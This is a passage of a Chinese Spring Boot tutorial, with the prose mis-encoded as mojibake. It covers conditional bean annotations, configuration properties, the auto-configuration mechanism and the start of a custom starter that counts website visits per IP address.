Cat();\n}\n```\n\nè¿™ç§æ¡ä»¶è¿˜å¯ä»¥åšå¹¶ä¸”çš„é€»è¾‘å…³ç³»ï¼Œå†™2ä¸ªå°±æ˜¯2ä¸ªæ¡ä»¶éƒ½æˆç«‹ï¼Œå†™å¤šä¸ªå°±æ˜¯å¤šä¸ªæ¡ä»¶éƒ½æˆç«‹ã€‚\n\n```java\n@Bean\n@ConditionalOnClass(name = \"com.jianjian.bean.Wolf\")\n@ConditionalOnMissingClass(\"com.jianjian.bean.Mouse\")\npublic Cat tom(){\n    return new Cat();\n}\n```\n\n- `@ConditionalOnWebApplication`åˆ¤å®šå½“å‰å®¹å™¨ç¯å¢ƒæ˜¯å¦æ˜¯webç¯å¢ƒã€‚\n\n```java\n@Bean\n@ConditionalOnWebApplication\npublic Cat tom(){\n    return new Cat();\n}\n```\n\n- `@ConditionalOnNotWebApplication`åˆ¤å®šå®¹å™¨ç¯å¢ƒæ˜¯å¦æ˜¯éwebç¯å¢ƒã€‚\n\n```java\n@Bean\n@ConditionalOnNotWebApplication\npublic Cat tom(){\n    return new Cat();\n}\n```\n\n- `@ConditionalOnBean`åˆ¤å®šæ˜¯å¦åŠ è½½äº†æŒ‡å®šåç§°çš„bean\n\n```java\n@Bean\n@ConditionalOnBean(name=\"jerry\")\npublic Cat tom(){\n    return new Cat();\n}\n```\n\n**æ€»ç»“**\n\nspringbootå®šä¹‰äº†è‹¥å¹²ç§æ§åˆ¶beanåŠ è½½çš„æ¡ä»¶è®¾ç½®æ³¨è§£ï¼Œç”±springå›ºå®šåŠ è½½beanå˜æˆäº†å¯ä»¥æ ¹æ®æƒ…å†µé€‰æ‹©æ€§çš„åŠ è½½bean\n\n## â‘¢beançš„ä¾èµ–å±æ€§\n\nbeançš„åŠ è½½åŠåŠ è½½æ§åˆ¶å·²ç»æå®Œäº†ï¼Œä¸‹é¢ç ”ç©¶ä¸€ä¸‹beanå†…éƒ¨çš„äº‹æƒ…ã€‚beanåœ¨è¿è¡Œçš„æ—¶å€™ï¼Œå®ç°å¯¹åº”çš„ä¸šåŠ¡é€»è¾‘æ—¶æœ‰å¯èƒ½éœ€è¦å¼€å‘è€…æä¾›ä¸€äº›è®¾ç½®å€¼ï¼Œæœ‰å°±æ˜¯å±æ€§äº†ã€‚å¦‚æœä½¿ç”¨æ„é€ æ–¹æ³•å°†å‚æ•°å›ºå®šï¼Œçµæ´»æ€§ä¸è¶³ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥ä½¿ç”¨beançš„å±æ€§é…ç½®è¿›è¡Œçµæ´»çš„é…ç½®äº†ã€‚\n\n**æ­¥éª¤â‘ ï¼š**å…ˆé€šè¿‡ymlé…ç½®æ–‡ä»¶ï¼Œè®¾ç½®beanè¿è¡Œéœ€è¦ä½¿ç”¨çš„é…ç½®ä¿¡æ¯ã€‚\n\n```yaml\ncartoon:\n  cat:\n    name: \"å›¾å¤šç›–æ´›\"\n    age: 5\n  mouse:\n    name: \"æ³°è²\"\n    age: 1\n```\n\n**æ­¥éª¤â‘¡ï¼š**ç„¶åå®šä¹‰ä¸€ä¸ªå°è£…å±æ€§çš„ä¸“ç”¨ç±»ï¼ŒåŠ è½½é…ç½®å±æ€§ï¼Œè¯»å–å¯¹åº”å‰ç¼€ç›¸å…³çš„å±æ€§å€¼ã€‚\n\n```java\n@ConfigurationProperties(prefix = \"cartoon\")\n@Data\npublic class CartoonProperties {\n    private Cat cat;\n    private Mouse mouse;\n}\n```\n\n**æ­¥éª¤â‘¢ï¼š**æœ€ååœ¨ä½¿ç”¨çš„ä½ç½®æ³¨å…¥å¯¹åº”çš„é…ç½®å³å¯ã€‚\n\n```java\n@EnableConfigurationProperties(CartoonProperties.class)\npublic class CartoonCatAndMouse{\n    @Autowired\n    private CartoonProperties cartoonProperties;\n}\n```\n\nå»ºè®®åœ¨ä¸šåŠ¡ç±»ä¸Šä½¿ç”¨@EnableConfigurationPropertieså£°æ˜beanï¼Œè¿™æ ·åœ¨ä¸ä½¿ç”¨è¿™ä¸ªç±»çš„æ—¶å€™ï¼Œä¹Ÿä¸ä¼šæ— æ•…åŠ è½½ä¸“ç”¨çš„å±æ€§é…ç½®ç±»CartoonPropertiesï¼Œå‡å°‘springç®¡æ§çš„èµ„æºæ•°é‡ã€‚\n\n## â‘£è‡ªåŠ¨è£…é…åŸç†\n\nå•¥å«è‡ªåŠ¨é…ç½®å‘¢ï¼Ÿç®€å•è¯´å°±æ˜¯springbootæ ¹æ®æˆ‘ä»¬å¼€å‘è€…çš„è¡Œä¸ºçŒœæµ‹ä½ è¦åšä»€ä¹ˆäº‹æƒ…ï¼Œç„¶åæŠŠä½ è¦ç”¨çš„beanéƒ½ç»™ä½ å‡†å¤‡å¥½ã€‚springbootå’‹åšåˆ°çš„å‘¢ï¼Ÿå°±æ˜¯çœ‹ä½ å¯¼å…¥äº†ä»€ä¹ˆç±»ï¼Œå°±çŸ¥é“ä½ æƒ³å¹²ä»€ä¹ˆäº†ã€‚ç„¶åæŠŠä½ æœ‰å¯èƒ½è¦ç”¨çš„beanéƒ½ç»™ä½ åŠ è½½å¥½ï¼Œä½ ç›´æ¥ä½¿ç”¨å°±è¡Œäº†ï¼ŒspringbootæŠŠæ‰€éœ€è¦çš„ä¸€åˆ‡å·¥ä½œéƒ½åšå®Œäº†ã€‚æ•´ä½“è¿‡ç¨‹åˆ†ä¸º2ä¸ªé˜¶æ®µï¼š\n\n**é˜¶æ®µä¸€ï¼šå‡†å¤‡é˜¶æ®µ**\n\n1. springbootçš„å¼€å‘äººå‘˜å…ˆå¤§é‡æ”¶é›†Springå¼€å‘è€…çš„ç¼–ç¨‹ä¹ æƒ¯ï¼Œæ•´ç†å¼€å‘è¿‡ç¨‹æ¯ä¸€ä¸ªç¨‹åºç»å¸¸ä½¿ç”¨çš„æŠ€æœ¯åˆ—è¡¨ï¼Œå½¢æˆä¸€ä¸ª**æŠ€æœ¯é›†A**\n\n2. æ”¶é›†**æŠ€æœ¯é›†A**çš„æœ€å¸¸ç”¨çš„è®¾ç½®ï¼ŒæŠŠè¿™äº›è®¾ç½®ä½œä¸ºé»˜è®¤å€¼ç›´æ¥è®¾ç½®å¥½ï¼Œå¾—åˆ°å¼€å‘è¿‡ç¨‹ä¸­æ¯ä¸€ä¸ªæŠ€æœ¯çš„å¸¸ç”¨è®¾ç½®ï¼Œå½¢æˆæ¯ä¸€ä¸ªæŠ€æœ¯å¯¹åº”çš„**è®¾ç½®é›†B**\n\n\n**é˜¶æ®µäºŒï¼šåŠ è½½é˜¶æ®µ**\n\n3. springbootåˆå§‹åŒ–Springå®¹å™¨åŸºç¡€ç¯å¢ƒï¼Œè¯»å–ç”¨æˆ·çš„é…ç½®ä¿¡æ¯ï¼ŒåŠ è½½ç”¨æˆ·è‡ªå®šä¹‰çš„beanå’Œå¯¼å…¥çš„åæ ‡ï¼Œå½¢æˆ**åˆå§‹åŒ–ç¯å¢ƒ**\n4. springbootå°†**æŠ€æœ¯é›†A**åŒ…å«çš„æ‰€æœ‰æŠ€æœ¯åœ¨SpringBootå¯åŠ¨æ—¶é»˜è®¤å…¨éƒ¨åŠ è½½ï¼Œè¿™æ—¶è‚¯å®šåŠ è½½çš„ä¸œè¥¿æœ‰ä¸€äº›æ˜¯æ— æ•ˆçš„ï¼Œæ²¡æœ‰ç”¨çš„\n5. springbootä¼šå¯¹**æŠ€æœ¯é›†A**ä¸­æ¯ä¸€ä¸ªæŠ€æœ¯çº¦å®šå¯åŠ¨è¿™ä¸ªæŠ€æœ¯å¯¹åº”çš„æ¡ä»¶ï¼Œå¹¶è®¾ç½®æˆæŒ‰æ¡ä»¶åŠ è½½ï¼Œç”±äºå¼€å‘è€…å¯¼å…¥äº†ä¸€äº›beanå’Œåæ ‡ï¼Œä¹Ÿå°±æ˜¯ä¸**åˆå§‹åŒ–ç¯å¢ƒ**ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥æ ¹æ®è¿™ä¸ª**åˆå§‹åŒ–ç¯å¢ƒ**ä¸springbootçš„**æŠ€æœ¯é›†A**è¿›è¡Œæ¯”å¯¹äº†ï¼Œå“ªä¸ªåŒ¹é…ä¸ŠåŠ è½½å“ªä¸ª\n6. å› ä¸ºæœ‰äº›æŠ€æœ¯ä¸åšé…ç½®å°±æ— æ³•å·¥ä½œï¼Œæ‰€ä»¥springbootå…ˆåŠ è½½**è®¾ç½®é›†B**ä¸­çš„é»˜è®¤å€¼ï¼Œè¿™æ ·å¯ä»¥å‡å°‘å¼€å‘è€…é…ç½®å‚æ•°çš„å·¥ä½œé‡\n7. ä½†æ˜¯é»˜è®¤é…ç½®ä¸ä¸€å®šèƒ½è§£å†³é—®é¢˜ï¼Œäºæ˜¯springbootå¼€æ”¾ä¿®æ”¹**è®¾ç½®é›†B**çš„æ¥å£ï¼Œå¯ä»¥ç”±å¼€å‘è€…æ ¹æ®éœ€è¦å†³å®šæ˜¯å¦è¦†ç›–é»˜è®¤é…ç½®\n\nå‡å®šæˆ‘ä»¬æƒ³è‡ªå·±å®ç°è‡ªåŠ¨é…ç½®çš„åŠŸèƒ½ï¼Œéƒ½è¦åšå“ªäº›å·¥ä½œå‘¢ï¼Ÿ\n\n- é¦–å…ˆæŒ‡å®šä¸€ä¸ªæŠ€æœ¯Xï¼Œæˆ‘ä»¬æ‰“ç®—è®©æŠ€æœ¯Xå…·å¤‡è‡ªåŠ¨é…ç½®çš„åŠŸèƒ½ï¼Œè¿™ä¸ªæŠ€æœ¯Xå¯ä»¥æ˜¯ä»»æ„åŠŸèƒ½ï¼Œè¿™ä¸ªæŠ€æœ¯éš¶å±äºä¸Šé¢æè¿°çš„**æŠ€æœ¯é›†A**\n\n```java\npublic class CartoonCatAndMouse{\n}\n```\n\n- ç„¶åæ‰¾å‡ºæŠ€æœ¯Xä½¿ç”¨è¿‡ç¨‹ä¸­çš„å¸¸ç”¨é…ç½®Yï¼Œè¿™ä¸ªé…ç½®éš¶å±äºä¸Šé¢è¡¨è¿°çš„**è®¾ç½®é›†B**\n\n```yaml\ncartoon:\n  cat:\n    name: \"å›¾å¤šç›–æ´›\"\n    age: 5\n  mouse:\n    name: \"æ³°è²\"\n    age: 1\n```\n\n- ç„¶åå®šä¹‰ä¸€ä¸ªå±æ€§ç±»å°è£…å¯¹åº”çš„é…ç½®å±æ€§ï¼Œè¿™ä¸ªè¿‡ç¨‹å…¶å®å°±æ˜¯ä¸Šä¸€èŠ‚å’±ä»¬åšçš„beançš„ä¾èµ–å±æ€§ç®¡ç†ï¼Œä¸€æ¨¡ä¸€æ ·\n\n```JAVA\n@ConfigurationProperties(prefix = \"cartoon\")\n@Data\npublic class CartoonProperties {\n    private Cat cat;\n    private Mouse mouse;\n}\n```\n\n- æœ€ååšä¸€ä¸ªé…ç½®ç±»ï¼Œå½“è¿™ä¸ªç±»åŠ è½½çš„æ—¶å€™å°±å¯ä»¥åˆå§‹åŒ–å¯¹åº”çš„åŠŸèƒ½beanï¼Œå¹¶ä¸”å¯ä»¥åŠ è½½åˆ°å¯¹åº”çš„é…ç½®\n\n```JAVA\n@EnableConfigurationProperties(CartoonProperties.class)\npublic class CartoonCatAndMouse implements ApplicationContextAware {\n    private CartoonProperties cartoonProperties;\n}\n```\n\n- å½“ç„¶ï¼Œä½ ä¹Ÿå¯ä»¥ä¸ºå½“å‰è‡ªåŠ¨é…ç½®ç±»è®¾ç½®ä¸Šæ¿€æ´»æ¡ä»¶ï¼Œä¾‹å¦‚ä½¿ç”¨@CondtionOnä¸ºå…¶è®¾ç½®åŠ è½½æ¡ä»¶\n\n```JAVA\n@ConditionalOnClass(name=\"org.springframework.data.redis.core.RedisOperations\")\n@EnableConfigurationProperties(CartoonProperties.class)\npublic class CartoonCatAndMouse implements ApplicationContextAware {\n    private CartoonProperties cartoonProperties;\n}\n```\n\nåšåˆ°è¿™é‡Œéƒ½å·²ç»åšå®Œäº†ï¼Œä½†æ˜¯é‡åˆ°äº†ä¸€ä¸ªå…¨æ–°çš„é—®é¢˜ï¼Œå¦‚ä½•è®©springbootå¯åŠ¨çš„æ—¶å€™å»åŠ è½½è¿™ä¸ªç±»å‘¢ï¼Ÿå¦‚æœä¸åŠ è½½çš„è¯ï¼Œæˆ‘ä»¬åšçš„æ¡ä»¶åˆ¤å®šï¼Œåšçš„å±æ€§åŠ è½½è¿™äº›å…¨éƒ¨éƒ½å¤±æ•ˆäº†ã€‚springbootä¸ºæˆ‘ä»¬å¼€æ”¾äº†ä¸€ä¸ªé…ç½®å…¥å£ï¼Œåœ¨ç±»è·¯å¾„(resources/)ä¸‹åˆ›å»º`META-INF`ç›®å½•ï¼Œå¹¶åˆ›å»º`spring.factories`æ–‡ä»¶ï¼Œåœ¨å…¶ä¸­æ·»åŠ è®¾ç½®ï¼Œè¯´æ˜å“ªäº›ç±»è¦å¯åŠ¨è‡ªåŠ¨é…ç½®å°±å¯ä»¥äº†ã€‚\n\n```properties\n# Auto Configure\norg.springframework.boot.autoconfigure.EnableAutoConfiguration=\\\ncom.jianjian.bean.CartoonCatAndMouse\n```\n\nå…¶å®è¿™ä¸ªæ–‡ä»¶å°±åšäº†ä¸€ä»¶äº‹ï¼Œé€šè¿‡è¿™ç§é…ç½®çš„æ–¹å¼åŠ è½½äº†æŒ‡å®šçš„ç±»ã€‚é‚£è‡ªåŠ¨é…ç½®çš„æ ¸å¿ƒç©¶ç«Ÿæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿè‡ªåŠ¨é…ç½®å…¶å®æ˜¯ä¸€ä¸ªå°çš„ç”Ÿæ€ï¼Œå¯ä»¥æŒ‰ç…§å¦‚ä¸‹æ€æƒ³ç†è§£ï¼š\n\n1. è‡ªåŠ¨é…ç½®ä»æ ¹æœ¬ä¸Šæ¥è¯´å°±æ˜¯ä¸€ä¸ªbeançš„åŠ è½½\n2. é€šè¿‡beanåŠ è½½æ¡ä»¶çš„æ§åˆ¶ç»™å¼€å‘è€…ä¸€ç§æ„Ÿè§‰ï¼Œè‡ªåŠ¨é…ç½®æ˜¯è‡ªé€‚åº”çš„ï¼Œå¯ä»¥æ ¹æ®æƒ…å†µè‡ªå·±åˆ¤å®šï¼Œä½†å®é™…ä¸Šå°±æ˜¯æœ€æ™®é€šçš„åˆ†æ”¯è¯­å¥çš„åº”ç”¨ï¼Œè¿™æ˜¯è’™è”½æˆ‘ä»¬åŒçœ¼çš„ç¬¬ä¸€å±‚é¢çº±\n3. ä½¿ç”¨beançš„æ—¶å€™ï¼Œå¦‚æœä¸è®¾ç½®å±æ€§ï¼Œå°±æœ‰é»˜è®¤å€¼ï¼Œå¦‚æœä¸æƒ³ç”¨é»˜è®¤å€¼ï¼Œå°±å¯ä»¥è‡ªå·±è®¾ç½®ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥ä¿®æ”¹éƒ¨åˆ†æˆ–è€…å…¨éƒ¨å‚æ•°ï¼Œä¹Ÿæ˜¯ä¸€ç§è‡ªé€‚åº”çš„å½¢å¼ï¼Œå…¶å®è¿˜æ˜¯éœ€è¦ä½¿ç”¨åˆ†æ”¯è¯­å¥æ¥åšåˆ¤æ–­çš„ï¼Œè¿™æ˜¯è’™è”½æˆ‘ä»¬åŒçœ¼çš„ç¬¬äºŒå±‚é¢çº±\n4. springbootæŠ€æœ¯æå‰å°†å¤§é‡å¼€å‘è€…æœ‰å¯èƒ½ä½¿ç”¨çš„æŠ€æœ¯æå‰åšå¥½äº†ï¼Œæ¡ä»¶ä¹Ÿå†™å¥½äº†ï¼Œç”¨çš„æ—¶å€™ä½ å¯¼å…¥äº†ä¸€ä¸ªåæ ‡ï¼Œå¯¹åº”æŠ€æœ¯å°±å¯ä»¥ä½¿ç”¨äº†ï¼Œå…¶å®å°±æ˜¯æå‰å¸®æˆ‘ä»¬æŠŠspring.factoriesæ–‡ä»¶å†™å¥½äº†ï¼Œè¿™æ˜¯è’™è”½æˆ‘ä»¬åŒçœ¼çš„ç¬¬ä¸‰å±‚é¢çº±\n\nâ€‹\t\tä½ åœ¨ä¸çŸ¥é“è‡ªåŠ¨é…ç½®è¿™ä¸ªçŸ¥è¯†çš„æƒ…å†µä¸‹ï¼Œç»è¿‡ä¸Šé¢è¿™ä¸€äºŒä¸‰ï¼Œä½ å½“ç„¶è§‰å¾—è‡ªåŠ¨é…ç½®æ˜¯ä¸€ç§ç‰¹åˆ«ç‰›çš„æŠ€æœ¯ï¼Œä½†æ˜¯ä¸€çª¥ç©¶ç«Ÿåå‘ç°ï¼Œä¹Ÿå°±é‚£ä¹ˆå›äº‹ã€‚è€Œä¸”ç°åœ¨springbootç¨‹åºå¯åŠ¨æ—¶ï¼Œåœ¨åå°å·å·çš„åšäº†è¿™ä¹ˆå¤šæ¬¡æ£€æµ‹ï¼Œè¿™ä¹ˆå¤šç§æƒ…å†µåˆ¤å®šï¼Œä¸ç”¨é—®äº†ï¼Œæ•ˆç‡ä¸€å®šæ˜¯éå¸¸ä½çš„ï¼Œæ¯•ç«Ÿå®ƒè¦æ£€æµ‹100ä½™ç§æŠ€æœ¯æ˜¯å¦åœ¨ä½ ç¨‹åºä¸­ä½¿ç”¨ã€‚\n\n**æ€»ç»“**\n\n1. springbootå¯åŠ¨æ—¶å…ˆåŠ è½½spring.factoriesæ–‡ä»¶ä¸­çš„org.springframework.boot.autoconfigure.EnableAutoConfigurationé…ç½®é¡¹ï¼Œå°†å…¶ä¸­é…ç½®çš„æ‰€æœ‰çš„ç±»éƒ½åŠ è½½æˆbean\n2. åœ¨åŠ è½½beançš„æ—¶å€™ï¼Œbeanå¯¹åº”çš„ç±»å®šä¹‰ä¸Šéƒ½è®¾ç½®æœ‰åŠ è½½æ¡ä»¶ï¼Œå› æ­¤æœ‰å¯èƒ½åŠ è½½æˆåŠŸï¼Œä¹Ÿå¯èƒ½æ¡ä»¶æ£€æµ‹å¤±è´¥ä¸åŠ è½½bean\n3. å¯¹äºå¯ä»¥æ­£å¸¸åŠ è½½æˆbeançš„ç±»ï¼Œé€šå¸¸ä¼šé€šè¿‡@EnableConfigurationPropertiesæ³¨è§£åˆå§‹åŒ–å¯¹åº”çš„é…ç½®å±æ€§ç±»å¹¶åŠ è½½å¯¹åº”çš„é…ç½®\n4. é…ç½®å±æ€§ç±»ä¸Šé€šå¸¸ä¼šé€šè¿‡@ConfigurationPropertiesåŠ è½½æŒ‡å®šå‰ç¼€çš„é…ç½®ï¼Œå½“ç„¶è¿™äº›é…ç½®é€šå¸¸éƒ½æœ‰é»˜è®¤å€¼ã€‚å¦‚æœæ²¡æœ‰é»˜è®¤å€¼ï¼Œå°±å¼ºåˆ¶ä½ å¿…é¡»é…ç½®åä½¿ç”¨äº†\n\n## â‘¤å˜æ›´è‡ªåŠ¨é…ç½®\n\nspringbootçš„è‡ªåŠ¨é…ç½®å¹¶ä¸æ˜¯å¿…ç„¶è¿è¡Œçš„ï¼Œå¯ä»¥é€šè¿‡é…ç½®çš„å½¢å¼å¹²é¢„æ˜¯å¦å¯ç”¨å¯¹åº”çš„è‡ªåŠ¨é…ç½®åŠŸèƒ½ã€‚ç³»ç»Ÿé»˜è®¤ä¼šåŠ è½½100å¤šç§è‡ªåŠ¨é…ç½®çš„æŠ€æœ¯ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆæ‰‹å·¥å¹²é¢„æ­¤å·¥ç¨‹ï¼Œç¦ç”¨ä¸€äº›è‡ªåŠ¨é…ç½®\n\n**æ–¹å¼ä¸€ï¼šé€šè¿‡yamlé…ç½®è®¾ç½®æ’é™¤æŒ‡å®šçš„è‡ªåŠ¨é…ç½®ç±»**\n\n```YAML\nspring:\n  autoconfigure:\n    exclude:\n      - org.springframework.boot.autoconfigure.task.TaskExecutionAutoConfiguration\n```\n\n**æ–¹å¼äºŒï¼šé€šè¿‡æ³¨è§£å‚æ•°æ’é™¤è‡ªåŠ¨é…ç½®ç±»**\n\n```JAVA\n@EnableAutoConfiguration(excludeName = \"\",exclude = {})\n```\n\n**æ–¹å¼ä¸‰ï¼šæ’é™¤åæ ‡ï¼ˆåº”ç”¨é¢è¾ƒçª„ï¼‰**\n\nä¾‹å¦‚webç¨‹åºå¯åŠ¨æ—¶ä¼šè‡ªåŠ¨å¯åŠ¨tomcatæœåŠ¡å™¨ï¼Œå¯ä»¥é€šè¿‡æ’é™¤åæ ‡çš„æ–¹å¼ï¼Œè®©åŠ è½½tomcatæœåŠ¡å™¨çš„æ¡ä»¶å¤±æ•ˆã€‚ä¸è¿‡éœ€è¦æé†’ä¸€ç‚¹ï¼Œä½ æŠŠtomcatæ’é™¤æ‰ï¼Œè®°å¾—å†åŠ ä¸€ç§å¯ä»¥è¿è¡Œçš„æœåŠ¡å™¨ã€‚\n\n```XML\n<dependencies>\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-web</artifactId>\n        <!--webèµ·æ­¥ä¾èµ–ç¯å¢ƒä¸­ï¼Œæ’é™¤Tomcatèµ·æ­¥ä¾èµ–ï¼ŒåŒ¹é…è‡ªåŠ¨é…ç½®æ¡ä»¶-->\n        <exclusions>\n            <exclusion>\n                <groupId>org.springframework.boot</groupId>\n                <artifactId>spring-boot-starter-tomcat</artifactId>\n            </exclusion>\n        </exclusions>\n    </dependency>\n    <!--æ·»åŠ Jettyèµ·æ­¥ä¾èµ–ï¼ŒåŒ¹é…è‡ªåŠ¨é…ç½®æ¡ä»¶-->\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-jetty</artifactId>\n    </dependency>\n</dependencies>\n```\n\n# 2.è‡ªå®šä¹‰starterå¼€å‘\n\nè‡ªåŠ¨é…ç½®å­¦ä¹ å®Œåï¼Œæˆ‘ä»¬å°±å¯ä»¥åŸºäºè‡ªåŠ¨é…ç½®çš„ç‰¹æ€§ï¼Œå¼€å‘springbootæŠ€æœ¯ä¸­æœ€å¼•ä»¥ä¸ºå‚²çš„åŠŸèƒ½äº†ï¼Œstarterã€‚å…¶å®é€šè¿‡å‰æœŸå­¦ä¹ ï¼Œæˆ‘ä»¬å‘ç°ç”¨ä»€ä¹ˆæŠ€æœ¯ç›´æ¥å¯¼å…¥å¯¹åº”çš„starterï¼Œç„¶åå°±å®ç°äº†springbootæ•´åˆå¯¹åº”æŠ€æœ¯ï¼Œå†åŠ ä¸Šä¸€äº›ç®€å•çš„é…ç½®ï¼Œå°±å¯ä»¥ç›´æ¥ä½¿ç”¨äº†ã€‚è¿™ç§è®¾è®¡æ–¹å¼å¯¹å¼€å‘è€…éå¸¸å‹å¥½ï¼Œæœ¬ç« å°±é€šè¿‡ä¸€ä¸ªæ¡ˆä¾‹çš„åˆ¶ä½œï¼Œå¼€å‘è‡ªå®šä¹‰starteræ¥å®ç°è‡ªå®šä¹‰åŠŸèƒ½çš„å¿«æ·æ·»åŠ ã€‚\n\n## â“ªæ¡ˆä¾‹ï¼šç½‘ç«™è®¿é—®æ¬¡æ•°\n\n> æœ¬æ¡ˆä¾‹çš„åŠŸèƒ½æ˜¯ç»Ÿè®¡ç½‘ç«™ç‹¬ç«‹IPè®¿é—®æ¬¡æ•°çš„åŠŸèƒ½ï¼Œå¹¶å°†è®¿é—®ä¿¡æ¯åœ¨åå°æŒç»­è¾“å‡ºã€‚æ•´ä½“åŠŸèƒ½æ˜¯åœ¨åå°æ¯10ç§’è¾“å‡ºä¸€æ¬¡ç›‘æ§ä¿¡æ¯ï¼ˆæ ¼å¼ï¼šIP+è®¿é—®æ¬¡æ•°ï¼‰ ï¼Œå½“ç”¨æˆ·è®¿é—®ç½‘ç«™æ—¶ï¼Œå¯¹ç”¨æˆ·çš„è®¿é—®è¡Œä¸ºè¿›è¡Œç»Ÿè®¡ã€‚\n>\n> ä¾‹å¦‚ï¼šå¼ ä¸‰è®¿é—®ç½‘ç«™åŠŸèƒ½15æ¬¡ï¼ŒIPåœ°å€ï¼š192.168.0.135ï¼Œæå››è®¿é—®ç½‘ç«™åŠŸèƒ½20æ¬¡ï¼ŒIPåœ°å€ï¼š61.129.65.248ã€‚é‚£ä¹ˆåœ¨ç½‘ç«™åå°å°±è¾“å‡ºå¦‚ä¸‹ç›‘æ§ä¿¡æ¯ï¼Œæ­¤ä¿¡æ¯æ¯10ç§’åˆ·æ–°ä¸€æ¬¡ã€‚\n>\n> ```bash\n>    IPè®¿é—®ç›‘æ§\n> +-----ip-address-----+--num--+\n> |     192.168.0.135  |   15  |\n> |     61.129.65.248  |   20  |\n> +--------------------+-------+\n> ```\n>\n> æœ¬åŠŸèƒ½æœ€ç»ˆè¦å®ç°çš„æ•ˆæœæ˜¯åœ¨ç°æœ‰çš„é¡¹ç›®ä¸­å¯¼å…¥ä¸€ä¸ªstarterï¼Œå¯¹åº”çš„åŠŸèƒ½å°±æ·»åŠ ä¸Šäº†ï¼Œåˆ é™¤æ‰å¯¹åº”çš„starterï¼ŒåŠŸèƒ½å°±æ¶ˆå¤±äº†ï¼Œè¦æ±‚åŠŸèƒ½è¦ä¸åŸå§‹é¡¹ç›®å®Œå…¨è§£è€¦ã€‚å› æ­¤éœ€è¦å¼€å‘ä¸€ä¸ªç‹¬ç«‹çš„æ¨¡å—ï¼Œåˆ¶ä½œå¯¹åº”åŠŸèƒ½ã€‚\n\nåœ¨è¿›è¡Œå…·ä½“åˆ¶ä½œä¹‹å‰ï¼Œå…ˆå¯¹åŠŸèƒ½åšå…·ä½“çš„åˆ†æ\n\n1. æ•°æ®è®°å½•åœ¨ä»€ä¹ˆä½ç½®\n\n\næœ€ç»ˆè®°å½•çš„æ•°æ®æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ˆIPåœ°å€ï¼‰å¯¹åº”ä¸€ä¸ªæ•°å­—ï¼ˆè®¿é—®æ¬¡æ•°ï¼‰ï¼Œæ­¤å¤„å¯ä»¥é€‰æ‹©çš„æ•°æ®å­˜å‚¨æ¨¡å‹å¯ä»¥ä½¿ç”¨javaæä¾›çš„mapæ¨¡å‹ï¼Œä¹Ÿå°±æ˜¯key-valueçš„é”®å€¼å¯¹æ¨¡å‹ï¼Œæˆ–è€…å…·æœ‰key-valueé”®å€¼å¯¹æ¨¡å‹çš„å­˜å‚¨æŠ€æœ¯ï¼Œä¾‹å¦‚redisæŠ€æœ¯ã€‚æœ¬æ¡ˆä¾‹ä½¿ç”¨mapä½œä¸ºå®ç°æ–¹æ¡ˆã€‚\n\n2. ç»Ÿè®¡åŠŸèƒ½è¿è¡Œä½ç½®\n\nå› ä¸ºæ¯æ¬¡webè¯·æ±‚éƒ½éœ€è¦è¿›è¡Œç»Ÿè®¡ï¼Œå› æ­¤ä½¿ç”¨æ‹¦æˆªå™¨ä¼šæ˜¯æ¯”è¾ƒå¥½çš„æ–¹æ¡ˆï¼Œæœ¬æ¡ˆä¾‹ä½¿ç”¨æ‹¦æˆªå™¨æ¥å®ç°ã€‚ä¸è¿‡åœ¨åˆ¶ä½œåˆæœŸï¼Œå…ˆä½¿ç”¨è°ƒç”¨çš„å½¢å¼è¿›è¡Œæµ‹è¯•ï¼Œç­‰åŠŸèƒ½å®Œæˆäº†ï¼Œå†æ”¹æˆæ‹¦æˆªå™¨çš„å®ç°æ–¹æ¡ˆã€‚\n\n3. ä¸ºäº†æå‡ç»Ÿè®¡æ•°æ®å±•ç¤ºçš„çµæ´»åº¦ï¼Œä¸ºç»Ÿè®¡åŠŸèƒ½æ·»åŠ é…ç½®é¡¹ã€‚\n\n- è¾“å‡ºé¢‘åº¦ï¼Œé»˜è®¤10ç§’\n\n- æ•°æ®ç‰¹å¾ï¼šç´¯è®¡æ•°æ® / é˜¶æ®µæ•°æ®ï¼Œé»˜è®¤ç´¯è®¡æ•°æ®\n\n- è¾“å‡ºæ ¼å¼ï¼šè¯¦ç»†æ¨¡å¼ / æç®€æ¨¡å¼ \n\nåœ¨å¼€å‘ä¸­æˆ‘ä»¬åˆ†æˆè‹¥å¹²ä¸ªæ­¥éª¤å®ç°ã€‚å…ˆå®Œæˆæœ€åŸºæœ¬çš„ç»Ÿè®¡åŠŸèƒ½çš„åˆ¶ä½œï¼Œç„¶åå¼€å‘å‡ºç»Ÿè®¡æŠ¥è¡¨ï¼Œæ¥ä¸‹æ¥æŠŠæ‰€æœ‰çš„é…ç½®éƒ½è®¾ç½®å¥½ï¼Œæœ€åå°†æ‹¦æˆªå™¨åŠŸèƒ½å®ç°ï¼Œæ•´ä½“åŠŸèƒ½å°±åšå®Œäº†ã€‚\n\næœ€ç»ˆå®ç°ä»£ç ï¼šhttps://jwt1399.lanzouv.com/iG0LW0buql7g\n\n**é¡¹ç›®æ–‡ä»¶ç»“æ„**\n\n```bash\nipcount-spring-boot-starter\nâ”œâ”€â”€ pom.xml\nâ””â”€â”€ src\n    â””â”€â”€ main\n        â”œâ”€â”€ java\n        â”‚Â Â  â””â”€â”€ com\n        â”‚Â Â      â””â”€â”€ jianjian\n        â”‚Â Â          â”œâ”€â”€ IpcountApplication.java\n        â”‚Â Â          â”œâ”€â”€ autoconfigure\n        â”‚Â Â          â”‚Â Â  â””â”€â”€ IpAutoConfiguration.java\n        â”‚Â Â          â”œâ”€â”€ interceptor\n        â”‚Â Â          â”‚Â Â  â”œâ”€â”€ IpCountInterceptor.java\n        â”‚Â Â          â”‚Â Â  â””â”€â”€ SpringMvcConfig.java\n        â”‚Â Â          â”œâ”€â”€ properties\n        â”‚Â Â          â”‚Â Â  â””â”€â”€ IpProperties.java\n        â”‚Â Â          â””â”€â”€ service\n        â”‚Â Â              â””â”€â”€ IpCountService.java\n        â””â”€â”€ resources\n            â”œâ”€â”€ META-INF\n            â”‚Â Â  â”œâ”€â”€ spring-configuration-metadata.json\n            â”‚Â Â  â””â”€â”€ 